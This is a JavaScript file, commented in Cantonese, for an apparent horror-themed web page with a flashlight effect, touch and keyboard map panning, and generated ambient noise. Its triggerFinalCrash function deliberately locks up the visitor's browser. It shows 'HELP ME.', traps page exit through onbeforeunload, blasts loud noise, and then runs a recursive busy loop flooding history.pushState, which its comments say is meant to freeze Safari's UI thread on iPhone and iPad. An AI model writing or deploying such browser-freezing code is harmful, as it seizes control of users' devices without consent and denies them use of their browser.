let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let systemCrashed = false;

// 手機拖拽變數
let isDragging = false;
let lastX = 0, lastY = 0;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 修復手機音援 (需要 User Gesture)
function initAudio() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    
    // 建立一個持續嘅低頻 Glitch 聲
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 鎖死後嘅噪音
                output[i] = (Math.random() * 2 - 1) * 0.8;
            } else {
                // 鎖死前嘅微弱呼吸聲
                output[i] = (Math.random() * 0.05) + (Math.sin(t * 0.001) * 0.02);
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    
    // 如果係 iOS，需要 resume context
    if (audioCtx.state === 'suspended') audioCtx.resume();
    audioStarted = true;
}

// 2. 統一啟動函式 (PC/手機通用)
function startExperience() {
    if (intro) intro.style.display = 'none';
    
    // 請求全屏 (隱藏 UI)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});

    initAudio();
    isLightOn = true;
    updateFlashlight(mouseX, mouseY);
}

// 3. 全平台移動邏輯 (PC + 手機拖拽)
function updateFlashlight(x, y) {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

// --- 事件監聽 ---
// PC 鍵盤
window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    if (key === 'f') startExperience();
    const s = 60;
    if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

// 手機拖拽 (iPad/iPhone 專用移動)
window.addEventListener('touchstart', (e) => {
    if (!audioStarted) startExperience();
    isDragging = true;
    lastX = e.touches[0].clientX;
    lastY = e.touches[0].clientY;
    updateFlashlight(lastX, lastY);
}, { passive: false });

window.addEventListener('touchmove', (e) => {
    if (systemCrashed || !isDragging) return;
    e.preventDefault(); // 阻止手機頁面跳動
    let tx = e.touches[0].clientX;
    let ty = e.touches[0].clientY;
    posX += (tx - lastX);
    posY += (ty - lastY);
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight(tx, ty);
    lastX = tx; lastY = ty;
}, { passive: false });

window.addEventListener('touchend', () => isDragging = false);
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight(mouseX, mouseY);
});

// 4. 0.3 秒「防崩潰」鎖死邏輯 (iPhone/iPad 專用)
function triggerFinalCrash() {
    systemCrashed = true;
    window.onbeforeunload = () => "HELP ME.";

    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    setTimeout(() => {
        // iOS/Safari 特殊鎖死：唔好塞 RAM，係要塞住 UI Thread
        function freezeStep() {
            // 用一個唔會觸發 Memory Crash 嘅大運算
            let start = Date.now();
            while (Date.now() - start < 500) {
                // 同步寫入 History，令 Safari 嘅 UI 卡死
                window.history.pushState(null, null, "#" + Math.random());
                // 密集運算，但不分配大內存
                Math.sqrt(Math.random() * 999999) * Math.atan(Math.random());
            }
            // 立即再次呼叫，令瀏覽器冇時間檢查「頁面是否回應」
            freezeStep();
        }

        // 啟動噪音爆破
        initAudio(); 
        freezeStep();
    }, 300);
}

// 模擬生成 Glitch 塊 (測試用改短時間)
setTimeout(() => {
    const glitch = document.createElement('div');
    glitch.style.cssText = `position:absolute; width:40px; height:40px; background:white; left:${-posX + 200}px; top:${-posY + 200}px; z-index:1001;`;
    map.appendChild(glitch);
    setInterval(() => {
        const r = glitch.getBoundingClientRect();
        if (Math.abs(r.left - window.innerWidth/2) < 50 && Math.abs(r.top - window.innerHeight/2) < 50) triggerFinalCrash();
    }, 100);
}, 30000);
